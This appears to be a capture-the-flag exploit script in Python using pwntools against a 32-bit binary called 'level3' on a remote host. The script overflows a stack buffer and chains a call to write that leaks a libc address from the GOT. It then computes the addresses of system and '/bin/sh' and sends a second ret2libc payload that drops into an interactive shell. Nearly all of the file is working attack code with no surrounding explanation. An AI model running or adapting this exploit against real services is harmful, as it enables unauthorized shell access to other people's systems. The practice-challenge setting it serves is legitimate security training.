#coding=utf-8
from pwn import *
 
sh = remote('220.249.52.133',37661)
#sh=process('./level3')
 
#context.log_level = 'debug'
elf=ELF('./level3')
libc=ELF('./libc_32.so.6')
 
#get func address
#write_plt = 0x8048340
write_plt = elf.plt['write']
#write_got = 0x804a018，it is the .got.plt segment
write_got = elf.got['write']
#main_addr = 0x8048484
main_addr = elf.symbols['main']
 
payload = 'A'*0x88 + p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0xdeadbeef)
 
sh.sendlineafter("Input:\n",payload)
 
#leak write's addr in got
write_got_addr = u32(sh.recv()[:4])
#write_got_addr = u32(sh.recv(4))
print 'write_got address is',hex(write_got_addr)
 
#leak libc's addr
libc_addr = write_got_addr - libc.symbols['write']
print 'libc address is',hex(libc_addr)
 
#get system's addr
sys_addr = libc_addr + libc.symbols['system']
print 'system address is',hex(sys_addr)
 
#get bin/sh 's addr    strings -a -t x libc_32.so.6 | grep "/bin/sh"
#libc.search("/bin/sh").next()
bin_sh_addr = libc_addr + 0x15902b
print '/bin/sh address is',hex(bin_sh_addr)
 
#get second payload
payload0 = 'A'*0x88 + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)
 
sh.sendline(payload0)
sh.interactive()